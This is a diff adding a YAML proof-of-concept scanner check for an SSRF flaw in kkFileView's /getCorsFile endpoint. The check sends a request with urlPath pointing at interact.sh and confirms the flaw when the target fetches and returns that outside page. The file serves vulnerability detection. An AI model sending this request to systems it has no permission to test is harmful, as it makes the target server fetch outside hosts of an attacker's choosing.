@@ -1,0 +1,19 @@
+name: poc-yaml-kkfileview-getcorsfile-ssrf
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /getCorsFile?urlPath=http://interact.sh
+        expression: |
+            response.status == 200 && response.body.bstartsWith(bytes("<h1> Interactsh Server </h1>")) && response.body.bcontains(bytes("is an open-source tool for detecting out-of-band interaction")) && response.url.domain != "interact.sh"
+expression: r0()
+detail:
+    author: Aurora
+    links:
+        - https://github.com/kekingcn/kkFileView/issues/128
+    vulnerability:
+        id: CT-484687
+        level: high
